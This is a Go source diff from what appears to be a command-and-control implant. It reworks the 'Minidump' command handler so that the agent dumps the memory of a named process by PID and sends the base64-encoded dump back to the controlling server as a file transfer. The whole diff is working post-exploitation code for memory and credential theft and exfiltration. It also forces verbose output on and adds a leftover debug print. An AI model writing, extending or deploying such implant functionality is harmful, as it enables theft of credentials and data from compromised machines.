@@ -665,37 +665,44 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 			}
 			switch p.Command {
 			case "Minidump":
-				if a.Verbose {
+				//args: []string{process name, pid, temppath}
+				if a.Verbose || true {
 					message("note", "Received Minidump request")
+					fmt.Println(p.Args, len(p.Args))
 				}
 				//ensure the provided args are valid
-				if len(p.Args) < 1 {
+				if len(p.Args) < 2 {
 					//not enough args
 					if a.Verbose {
 						message("warn", fmt.Sprintf("Not enough args were provided to dump a process"))
-						break
 					}
+					break
 				}
 				process := p.Args[0] //string TODO: do some validation here I guess
 				//clean the arg - for some reason spaces at the start?
 				process = strings.Trim(process, " ")
 				pid := uint32(0)
-				if len(p.Args) > 1 {
-					//clean the arg - for some reason spaces at the start?
-					p.Args[1] = strings.Trim(p.Args[1], " ")
-					pidInt, err := strconv.ParseInt(p.Args[1], 0, 32)
-					if err != nil {
-						//probably not well formatted number
-						if a.Verbose {
-							message("warn", fmt.Sprintf("Could not parse pid value:"+p.Args[1]))
-							message("warn", fmt.Sprintf(err.Error()))
-						}
-						break
+
+				//clean the arg - for some reason spaces at the start?
+				p.Args[1] = strings.Trim(p.Args[1], " ")
+				pidInt, err := strconv.ParseInt(p.Args[1], 0, 32)
+				if err != nil {
+					//probably not well formatted number
+					if a.Verbose {
+						message("warn", fmt.Sprintf("Could not parse pid value:"+p.Args[1]))
+						message("warn", fmt.Sprintf(err.Error()))
 					}
-					pid = uint32(pidInt)
+					break
 				}
+				pid = uint32(pidInt)
+				tempPath := ""
+				if len(p.Args) == 3 {
+					tempPath = p.Args[2]
+				}
+
 				//get minidump
-				fileData, fileDataErr := miniDump(process, pid)
+				miniD, fileDataErr := miniDump(tempPath, process, pid)
+				fileData := miniD.FileContent
 
 				//copied and pasted from upload func, modified appropriately
 				if fileDataErr != nil {
@@ -738,7 +745,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 							fileHash.Sum(nil)))
 					}
 					c := messages.FileTransfer{
-						FileLocation: process + ".dmp",
+						FileLocation: fmt.Sprintf("%s.%d.dmp", miniD.ProcName, miniD.ProcID),
 						FileBlob:     base64.StdEncoding.EncodeToString([]byte(fileData)),
 						IsDownload:   true,
 						Job:          p.Job,
